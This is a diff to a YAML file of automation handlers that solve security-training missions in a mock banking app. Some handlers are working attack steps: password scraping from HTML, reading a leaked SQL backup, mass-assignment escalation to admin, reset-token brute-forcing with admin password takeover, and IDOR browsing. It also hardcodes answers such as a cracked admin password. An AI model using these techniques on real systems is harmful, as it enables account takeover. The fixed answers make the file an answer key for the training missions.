@@ -29,6 +29,73 @@ steps:
   # specific `logout-then-login` (title "log in" AND copy mentions "log out") must
   # precede plain `login-as` — else login-as would greedily claim Bob's step.
 
+  # Log in as a user whose credentials were DISCOVERED on the page, not named in the
+  # step text — the payoff of the "Cleartext password / passwords in HTML source"
+  # mission (step "Log in as user number 3"). The prior steps left the admin viewing
+  # /users/<id>, whose password field masks its value with asterisks but leaks the
+  # cleartext in a `password` HTML attribute (the vuln); the email shows as text. So,
+  # like `take-over-session`, the creds come from a live-page `context` (frame [0,0,0],
+  # the app), NOT the step copy. Then it's a logout-then-login: nav menu -> Logout,
+  # then type the discovered creds into the login form. Confirmed LIVE end-to-end
+  # (mission "Congratulations!" panel). MUST precede `logout-then-login` below: step 4's
+  # copy says "Log out as admin", so that broader handler would otherwise claim it and
+  # try (and fail) to read creds from the text. Its title `^log in as user number` is
+  # specific enough not to poach a plain "Log in as Alice".
+  - id: login-as-inspected-user
+    match:
+      title_regex: '(?i)^log in as user number'
+    context:
+      email:    { frame: "0/0/0", eval: "return (document.body.innerText.match(/Email:\\s*([\\w.+-]+@[\\w.-]+)/)||[])[1]" }
+      password: { frame: "0/0/0", eval: "return document.querySelector('input[password]').getAttribute('password')" }
+    do:
+      - ui: { action: click, frame: [0, 0, 0], by: xpath, selector: "//a[normalize-space(.)='menu']", settle: 1 }
+      - ui: { action: click, frame: [0, 0, 0], by: css, selector: '#menu-link-logout', settle: 2 }
+      - ui: { action: type,  frame: [0, 0, 0], by: css, selector: '#Username', value: '{email}' }
+      - ui: { action: type,  frame: [0, 0, 0], by: css, selector: '#Password', value: '{password}' }
+      - ui: { action: click, frame: [0, 0, 0], by: css, selector: '#login-btn-submit', settle: 3 }
+
+  # Log in as admin with a password WE set via a hijacked password reset — final step
+  # of the weak-reset-token mission ("Log in as admin": "head back to the login page and
+  # log in with admin@vikingbank.example and the newly chosen password"). The password
+  # is the one `change-admin-password` typed into the reset form (a fixed value we chose,
+  # NewP@ssw0rd1!), so it's hardcoded to match. Distinguished from `login-admin-cracked-
+  # password` (rainbow mission) by the "newly chosen password" phrasing, and placed
+  # BEFORE `login-as` because step 8 names the email in backticks — login-as would
+  # otherwise poach it and type its throwaway default. Confirmed LIVE end-to-end.
+  - id: login-admin-new-password
+    match:
+      title_regex: '(?i)^log in as admin'
+      desc_contains: 'newly chosen password'
+    do:
+      - ui: { action: type,  frame: [0, 0], by: css, selector: '#browserBar', value: 'auth/login', enter: true, settle: 3 }
+      - ui: { action: type,  frame: [0, 0, 0], by: css, selector: '#Username', value: 'admin@vikingbank.example' }
+      - ui: { action: type,  frame: [0, 0, 0], by: css, selector: '#Password', value: 'NewP@ssw0rd1!' }
+      - ui: { action: click, frame: [0, 0, 0], by: css, selector: '#login-btn-submit', settle: 3 }
+
+  # Log in as admin with a password LEAKED via static file browsing — final step of the
+  # directory-listing mission ("Log in as admin": "log in as the administrator
+  # admin@vikingbank.example with the password you've just discovered"). Earlier steps
+  # exposed /wwwroot/backup/CreateDefaultAdmin.sql (a static file the misconfigured server
+  # will serve to anyone), whose INSERT leaks the default admin password. Rather than
+  # hardcode it, a `context` eval RE-FETCHES that SQL file with a same-origin sync XHR from
+  # the app frame [0,0,0] and pulls the LAST single-quoted token (the Password column) — so
+  # it survives SCW rotating the value. Distinguished from the other two "Log in as admin"
+  # handlers by "just discovered" (vs "just found" / "newly chosen password"); placed before
+  # login-as because the email is backtick-quoted. Confirmed LIVE end-to-end 2026-07-13.
+  - id: login-admin-leaked-file
+    match:
+      title_regex: '(?i)^log in as admin'
+      desc_contains: 'just discovered'
+    context:
+      password:
+        frame: "0/0/0"
+        eval: "var x=new XMLHttpRequest();x.open('GET','/wwwroot/backup/CreateDefaultAdmin.sql',false);x.send();var m=x.responseText.match(/'[^']*'/g);return m?m[m.length-1].replace(/'/g,''):'';"
+    do:
+      - ui: { action: type,  frame: [0, 0], by: css, selector: '#browserBar', value: 'auth/login', enter: true, settle: 3 }
+      - ui: { action: type,  frame: [0, 0, 0], by: css, selector: '#Username', value: 'admin@vikingbank.example' }
+      - ui: { action: type,  frame: [0, 0, 0], by: css, selector: '#Password', value: '{password}' }
+      - ui: { action: click, frame: [0, 0, 0], by: css, selector: '#login-btn-submit', settle: 3 }
+
   # Log OUT then log in — a single checklist step whose copy says "Log out again.
   # This time, you log in as …" (vb-52 step 4, "Log in as Bob"). It's one checkbox,
   # so the handler must do both: the prior step left a *different* user logged in,
@@ -61,9 +128,19 @@ steps:
   # vuln is that ANY password is accepted — there's a minimum-length check that
   # fires *before* the broken auth, so the throwaway must be long enough. When the
   # step names a real password (Alice's `P@ssw0rd1!`) that wins via the regex.
+  #
+  # GATE: fire only when the step actually NAMES the account to use — a
+  # backtick-quoted email in the copy. Every genuine login step does ("Log in as
+  # `alice@alice.com`…", even "enter any password you like" ones name the user);
+  # steps where the password must be DISCOVERED first ("Log in as admin with the
+  # password you just found" — the rainbow-table/SHA256 mission) name no email, so
+  # login-as no longer poaches them, types a wrong default, and burns a doomed
+  # 20s verify. Those fall through to a purpose-built handler (or stop clean as
+  # mission-stuck) instead of `mission-blocked`.
   - id: login-as
     match:
       title_regex: '(?i)^log in'
+      desc_regex: '`[\w.+-]+@[\w.-]+`'
     extract:
       email:    { from: description, regex: '`([\w.+-]+@[\w.-]+)`' }
       password: { from: description, regex: 'password `([^`]+)`', default: 'password' }
@@ -71,6 +148,31 @@ steps:
       - ui: { action: type,  frame: [0, 0, 0], by: css, selector: '#Username', value: '{email}' }
       - ui: { action: type,  frame: [0, 0, 0], by: css, selector: '#Password', value: '{password}' }
       - ui: { action: click, frame: [0, 0, 0], by: css, selector: '#login-btn-submit', settle: 2 }
+
+  # Log in as admin with a password CRACKED from a leaked hash — the SHA256 /
+  # rainbow-table mission ("A password dump … has surfaced … hashing algorithm was
+  # SHA256 … we've provided a rainbow table"). Its only pod-verified step is
+  # "Log in as admin" ("Log in as the admin user with the password you just found.");
+  # the two prior steps just have you READ two files in the code pane and are
+  # informational (no checkbox). The crack, done by hand and validated LIVE 2026-07-13:
+  #   password-dump.txt : admin@vikingbank.example -> 5a012756f3fe06210fe8f3afca3176541d8ad232e9d34aa5aedf7c19715ad4b9
+  #   rainbow-table.txt : that hash               -> qwer123456
+  # so admin's password is `qwer123456`. This is a STATIC ANSWER (fixed training data),
+  # encoded like a courses/challenges.yaml key rather than computed: the two files live
+  # in MUI tabs that UNMOUNT the inactive panel (only the open file is ever in the DOM),
+  # so a single in-page eval can't read the dump AND the table to crack it live. If SCW
+  # ever rotates the dump/table, re-crack and update the password here.
+  # Match is tight (title "log in as admin" + the "password you just found" phrasing)
+  # so it can't poach another mission's admin login. login-as no longer competes (its
+  # gate needs a backtick email, absent here); logout-then-login needs "log out" (absent).
+  - id: login-admin-cracked-password
+    match:
+      title_regex: '(?i)^log in as admin'
+      desc_contains: 'password you just found'
+    do:
+      - ui: { action: type,  frame: [0, 0, 0], by: css, selector: '#Username', value: 'admin@vikingbank.example' }
+      - ui: { action: type,  frame: [0, 0, 0], by: css, selector: '#Password', value: 'qwer123456' }
+      - ui: { action: click, frame: [0, 0, 0], by: css, selector: '#login-btn-submit', settle: 3 }
 
   # Log out — a standalone checklist step ("Log out, and have a look at the code
   # …", vb-52 step 2). Same nav-menu -> Logout as above. Matches only titles that
@@ -83,21 +185,250 @@ steps:
       - ui: { action: click, frame: [0, 0, 0], by: css, selector: '#menu-link-logout', settle: 2 }
 
   # Visit an endpoint in the mocked app by typing the path into the mission's
-  # simulated address bar. The step reads "Navigate to the /`<path>` endpoint"; the
-  # path is the backtick-quoted token after the slash. Confirmed LIVE on the Broken
-  # Authentication / "Exposed Session Tokens" mission (step "Visit invoices"): the
-  # address bar `#browserBar` (frame [0,0], NOT the app frame [0,0,0] — it's the
+  # simulated address bar. The path is the backtick-quoted token after a slash in
+  # the step copy. Confirmed LIVE on two missions with different phrasings:
+  #   - "Exposed Session Tokens" (step "Visit invoices"): "Navigate to the
+  #     /`invoices` endpoint".
+  #   - "Broken Access Control" (step "Go to the hidden page"): "Access it by
+  #     adding /`users` to the browser bar".
+  # The address bar `#browserBar` (frame [0,0], NOT the app frame [0,0,0] — it's the
   # mission player's chrome) AUTO-PREPENDS the leading "/", so type the BARE path
   # without it — typing "/invoices" yields "//invoices" → Page Not Found. Enter
   # submits (the bar has no click target). Reusable: many missions send you to a
   # hidden/forbidden endpoint that has no menu link, which is the whole point.
+  #
+  # The match is the /`path` token PLUS a nav verb, deliberately broad enough to
+  # span both phrasings while never firing on a step that merely *mentions* a path
+  # (e.g. "the link to the /users page is hidden") — those lack the verb.
   - id: navigate-endpoint
     match:
-      desc_regex: '(?i)navigate to the /`[^`]+` endpoint'
+      desc_regex: '(?i)(navigate to|adding|go to|visit).{0,30}/`[^`]+`'
     extract:
       path: { from: description, regex: '/`([^`]+)`' }
     do:
       - ui: { action: type, frame: [0, 0], by: css, selector: '#browserBar', value: '{path}', enter: true, settle: 3 }
+
+  # Navigate to a page via the app's nav MENU (not the browserBar) — the
+  # "Cleartext password" mission, step "Go to the users page" ("Navigate to the Users
+  # page via the menu."). The menu links live in the app frame [0,0,0] as
+  # `#menu-link-<name>` (home/transfer/statements/invoices/profile/users/logout); open
+  # the menu, then click the Users link. Targeted to Users (the only menu-nav step
+  # observed); generalize to an extracted page name if others turn up (the id is
+  # lowercase, the copy capitalized, so a general version needs case folding).
+  # Confirmed LIVE (step ticked).
+  - id: goto-users-page
+    match:
+      title_regex: '(?i)^go to the users page'
+    do:
+      - ui: { action: click, frame: [0, 0, 0], by: xpath, selector: "//a[normalize-space(.)='menu']", settle: 1 }
+      - ui: { action: click, frame: [0, 0, 0], by: css, selector: '#menu-link-users', settle: 3 }
+
+  # View a specific user's detail page by id — "Cleartext password" mission, step
+  # "View user number 3". The user-detail URL is /users/<id>; the id is the number in
+  # the title. Navigate via the mission chrome #browserBar in frame [0,0] (bare path,
+  # it auto-prepends "/"). This leaves the app on /users/<id> for the later
+  # `login-as-inspected-user` step to scrape creds from. Confirmed LIVE (id 3).
+  - id: view-user-by-id
+    match:
+      title_regex: '(?i)^view user number \d+'
+    extract:
+      id: { from: title, regex: 'number (\d+)' }
+    do:
+      - ui: { action: type, frame: [0, 0], by: css, selector: '#browserBar', value: 'users/{id}', enter: true, settle: 3 }
+
+  # IDOR mission ("Insecure Direct Object Reference") — the invoice-detail pages
+  # are directly referenceable by id (/invoices/invoice/<id>) with no ownership
+  # check, so browsing ids reaches other users' invoices. Confirmed LIVE end-to-end.
+  # Of its six instructions only THREE are pod-verified (render a checklist checkbox
+  # → in `checkable`); the other three ("Inspect the URL", "View another one of your
+  # invoices", "Connect the dots") are informational reflection steps with no box, so
+  # the mission loop skips them. These handlers cover the three verified ones.
+
+  # Step 1 "View one of your invoices": go to the invoices list, then open the first
+  # one. Navigate via the mission chrome's #browserBar in frame [0,0] (it auto-prepends
+  # "/", so type the bare path); the View links live in the app frame [0,0,0] and their
+  # raw DOM text is "View" (CSS-uppercased to "VIEW" — see README's XPath gotcha).
+  # Clicking any own-invoice View ticks the step, so take the first — robust to whatever
+  # per-session ids exist. (List-nav + click authored from observation; ids/steps LIVE.)
+  - id: view-own-invoice
+    match:
+      title_regex: '(?i)^view one of your invoices'
+    do:
+      - ui: { action: type,  frame: [0, 0], by: css, selector: '#browserBar', value: 'invoices', enter: true, settle: 3 }
+      - ui: { action: click, frame: [0, 0, 0], by: xpath, selector: "(//a[normalize-space(.)='View'])[1]", settle: 3 }
+
+  # Steps 5 "Try another id" and 6 "View another user's invoice": both just visit an
+  # invoice-detail URL by a literal id named in the copy — "the number 25" (a missing
+  # id → 'invoice not found') and "number 7" (someone else's invoice, the IDOR payoff).
+  # Same primitive, so one handler keyed on either title; the id is the "number <n>"
+  # token. The /invoices/invoice/ path is this mission's URL shape — hardcoded (not
+  # scraped from the live bar) so it works even when this step is the resume entry
+  # point and the bar isn't already on an invoice page. Confirmed LIVE (ids 25, 7).
+  - id: browse-invoice-by-id
+    match:
+      title_regex: "(?i)^(try another id|view another user's invoice)"
+    extract:
+      id: { from: description, regex: 'number (\d+)' }
+    do:
+      - ui: { action: type, frame: [0, 0], by: css, selector: '#browserBar', value: 'invoices/invoice/{id}', enter: true, settle: 3 }
+
+  # --- Mass assignment / privilege-escalation mission --------------------------
+  # The /profile "change password" form's backend blindly binds EVERY posted field to the
+  # user record (mass assignment), including a `Role` it never renders — so adding a hidden
+  # Role=Admin input to the form and submitting a password change escalates the account to
+  # admin. 4 steps, all checkable. Step 1 "Log in as Alice" is handled by `login-as`; step 2
+  # "Visit the profile page" by `navigate-endpoint` (or `visit-profile-page` below). The new
+  # password we set (NewP@ssw0rd1!) is reused by `access-admin-page` to log back in.
+  # Confirmed LIVE end-to-end 2026-07-13.
+
+  # Step 2 "Visit the profile page": nav the #browserBar to `profile`. (navigate-endpoint may
+  # already claim this if the raw copy backtick-quotes /`profile`; this is the deterministic
+  # title-keyed fallback so the step is covered either way.)
+  - id: visit-profile-page
+    match:
+      title_regex: '(?i)^visit the profile page'
+    do:
+      - ui: { action: type, frame: [0, 0], by: css, selector: '#browserBar', value: 'profile', enter: true, settle: 3 }
+
+  # Step 3 "Escalate to the Admin role": the exploit. `eval` injects a hidden
+  # <input name="Role" value="Admin"> into the profile form (idempotent — skip if already
+  # present), then set a new password in both fields and Submit; the mass-assignment backend
+  # writes the smuggled Role alongside the password. The form is in the app frame [0,0,0].
+  - id: escalate-mass-assignment
+    match:
+      title_regex: '(?i)^escalate to the admin role'
+    do:
+      - eval: { frame: "0/0/0", script: "var f=document.querySelector('form'); if(f && !f.querySelector('[name=Role]')){var i=document.createElement('input'); i.type='hidden'; i.name='Role'; i.value='Admin'; f.appendChild(i);}" }
+      - ui: { action: type,  frame: [0, 0, 0], by: css, selector: '#Password', value: 'NewP@ssw0rd1!' }
+      - ui: { action: type,  frame: [0, 0, 0], by: css, selector: '#ConfirmPassword', value: 'NewP@ssw0rd1!' }
+      - ui: { action: click, frame: [0, 0, 0], by: css, selector: '#change-password-btn-submit', settle: 3 }
+
+  # Step 4 "Access an admin page": prove the escalation — log out, log back in as Alice with
+  # the just-set password, then visit /users (admin-only). The pod ticks the step on reaching
+  # the users page, NOT on login alone (confirmed live), so the final nav is required.
+  - id: access-admin-page
+    match:
+      title_regex: '(?i)^access an admin page'
+    do:
+      - ui: { action: click, frame: [0, 0, 0], by: xpath, selector: "//a[normalize-space(.)='menu']", settle: 1 }
+      - ui: { action: click, frame: [0, 0, 0], by: css, selector: '#menu-link-logout', settle: 2 }
+      - ui: { action: type,  frame: [0, 0, 0], by: css, selector: '#Username', value: 'alice@alice.com' }
+      - ui: { action: type,  frame: [0, 0, 0], by: css, selector: '#Password', value: 'NewP@ssw0rd1!' }
+      - ui: { action: click, frame: [0, 0, 0], by: css, selector: '#login-btn-submit', settle: 2 }
+      - ui: { action: type,  frame: [0, 0], by: css, selector: '#browserBar', value: 'users', enter: true, settle: 3 }
+
+  # --- Static file browsing / directory-listing mission ------------------------
+  # A misconfigured server has directory listing + static browsing enabled under
+  # STATIC_URL=/wwwroot, so anyone can walk the tree and read files that shouldn't be
+  # public — here /wwwroot/backup/CreateDefaultAdmin.sql, which leaks the seeded admin
+  # password. 4 steps; step 2 "Browse through the root directory" is informational (no
+  # checkbox → skipped). The final login is handled by `login-admin-leaked-file` above.
+  # All confirmed LIVE end-to-end 2026-07-13.
+
+  # Step 1 "List directory contents": browse the static root to get an "Index of /wwwroot/"
+  # listing. Nav the #browserBar (frame [0,0], bare path) to `wwwroot` (the STATIC_URL from
+  # config.py shown in the code pane). Reveals the backup/ folder.
+  - id: list-static-directory
+    match:
+      title_regex: '(?i)^list directory contents'
+    do:
+      - ui: { action: type, frame: [0, 0], by: css, selector: '#browserBar', value: 'wwwroot', enter: true, settle: 3 }
+
+  # Step 3 "Obtain admin credentials": open the backed-up SQL seed script directly (its path
+  # is named in the copy) to reveal the default admin password in cleartext. Just viewing it
+  # ticks the step; `login-admin-leaked-file` re-reads the same file for the password value.
+  - id: view-leaked-sql
+    match:
+      title_regex: '(?i)^obtain admin credentials'
+    do:
+      - ui: { action: type, frame: [0, 0], by: css, selector: '#browserBar', value: 'wwwroot/backup/CreateDefaultAdmin.sql', enter: true, settle: 3 }
+
+  # --- Weak password-reset-token / user-enumeration mission --------------------
+  # A 9-step IDOR-on-reset-tokens mission: the forgot-password flow emails a link whose
+  # `token` is a tiny random int (1-5), and the reset endpoint trusts an `email` query
+  # param — so you can reset ANOTHER user's (the admin's) password by guessing the token.
+  # Steps 3 ("Inspect the URL") and 6 ("Inspect the code") are informational (no checkbox
+  # → skipped). All selectors/flow confirmed LIVE end-to-end 2026-07-13. The password we
+  # set (`NewP@ssw0rd1!`) is a fixed value shared between change-admin-password and
+  # login-admin-new-password (above).
+
+  # Step 1 "Request a password change for Alice": open the forgot-password form and submit
+  # the backtick-quoted email. Nav straight to /auth/forgotpassword via the #browserBar
+  # (frame [0,0], bare path) rather than clicking the login page's "Forgot Password?" link
+  # — same form, and robust to the starting page.
+  - id: request-password-reset
+    match:
+      title_regex: '(?i)^request a password change'
+    extract:
+      email: { from: description, regex: '`([\w.+-]+@[\w.-]+)`' }
+    do:
+      - ui: { action: type,  frame: [0, 0], by: css, selector: '#browserBar', value: 'auth/forgotpassword', enter: true, settle: 3 }
+      - ui: { action: type,  frame: [0, 0, 0], by: css, selector: '#Email', value: '{email}' }
+      - ui: { action: click, frame: [0, 0, 0], by: css, selector: '#forgot-password-btn-submit', settle: 3 }
+
+  # Step 2 "Read the email": open the Email Client tab, open the "Reset Your Password"
+  # message, and click its "Reset Password" link (which carries Alice's ?email&token). All
+  # in the mission-player chrome frame [0,0] (same tab/inbox pattern as `check-answer`).
+  - id: read-reset-email
+    match:
+      title_regex: '(?i)^read the email'
+    do:
+      - ui: { action: click, frame: [0, 0], by: css,   selector: '#browser-tab-EMAIL_CLIENT', settle: 3 }
+      - ui: { action: click, frame: [0, 0], by: xpath, selector: "//button[contains(., 'Reset Your Password')]", settle: 2 }
+      - ui: { action: click, frame: [0, 0], by: xpath, selector: "//a[normalize-space(.)='Reset Password']", settle: 3 }
+
+  # Step 4 "Request a password reset for the admin": the user-enumeration beat — submit a
+  # non-existent address (nothing happens) then the admin's (a reset email IS sent, which
+  # leaks that the account exists). Both addresses are fixed in the copy. Reuses the same
+  # forgot-password form.
+  - id: request-reset-admin
+    match:
+      title_regex: '(?i)^request a password reset for the admin'
+    do:
+      - ui: { action: type,  frame: [0, 0], by: css, selector: '#browserBar', value: 'auth/forgotpassword', enter: true, settle: 3 }
+      - ui: { action: type,  frame: [0, 0, 0], by: css, selector: '#Email', value: 'randy@random.com' }
+      - ui: { action: click, frame: [0, 0, 0], by: css, selector: '#forgot-password-btn-submit', settle: 2 }
+      - ui: { action: type,  frame: [0, 0, 0], by: css, selector: '#Email', value: 'admin@vikingbank.example' }
+      - ui: { action: click, frame: [0, 0, 0], by: css, selector: '#forgot-password-btn-submit', settle: 3 }
+
+  # Step 5 "Modify the password reset URL": point the reset endpoint at the admin with a
+  # deliberately-wrong token=0 (the copy walks you to this exact URL) — lands on a "reset
+  # password failure" page, which ticks the step. Sets up the token guess next.
+  - id: modify-reset-url
+    match:
+      title_regex: '(?i)^modify the password reset url'
+    do:
+      - ui: { action: type, frame: [0, 0], by: css, selector: '#browserBar', value: 'profile/resetpassword?email=admin@vikingbank.example&token=0', enter: true, settle: 3 }
+
+  # Step 7 "Guess the reset token": the token is a random int in [1,5], so brute-force it.
+  # A `context` eval (in the app frame [0,0,0], same-origin) probes each candidate with a
+  # SYNCHRONOUS XHR — a plain GET, which renders the reset form but does NOT consume the
+  # token (only the change-password POST does), so probing is side-effect-free — and
+  # returns the first token whose response is the reset form (has #ConfirmPassword) rather
+  # than the failure page. The `do` then navigates the #browserBar to that winning token
+  # (the validated nav mechanism), landing on the admin's reset form. This keeps the loop
+  # in the eval and the actuation in a normal UI action. Token 1 hit live; the loop is
+  # authored-from-observation (the token is single-use, so it can't be re-validated here).
+  - id: guess-reset-token
+    match:
+      title_regex: '(?i)^guess the reset token'
+    context:
+      token:
+        frame: "0/0/0"
+        eval: "for(var n=1;n<=5;n++){var x=new XMLHttpRequest();x.open('GET','/profile/resetpassword?email=admin@vikingbank.example&token='+n,false);x.send();if(/ConfirmPassword/i.test(x.responseText)&&!/failure|invalid|expired/i.test(x.responseText))return n;}return 0;"
+    do:
+      - ui: { action: type, frame: [0, 0], by: css, selector: '#browserBar', value: 'profile/resetpassword?email=admin@vikingbank.example&token={token}', enter: true, settle: 3 }
+
+  # Step 8 "Change the admin password": on the reset form (reached by the guessed token),
+  # set both fields to our fixed new password and submit. login-admin-new-password then
+  # logs in with the same value.
+  - id: change-admin-password
+    match:
+      title_regex: '(?i)^change the admin password'
+    do:
+      - ui: { action: type,  frame: [0, 0, 0], by: css, selector: '#Password', value: 'NewP@ssw0rd1!' }
+      - ui: { action: type,  frame: [0, 0, 0], by: css, selector: '#ConfirmPassword', value: 'NewP@ssw0rd1!' }
+      - ui: { action: click, frame: [0, 0, 0], by: css, selector: '#reset-password-btn-submit', settle: 3 }
 
   # View a payment receipt (Broken Auth / "Exposed Session Tokens" mission, step
   # "View a receipt"). Under received invoices the paid ones expose a "RECEIPT" link
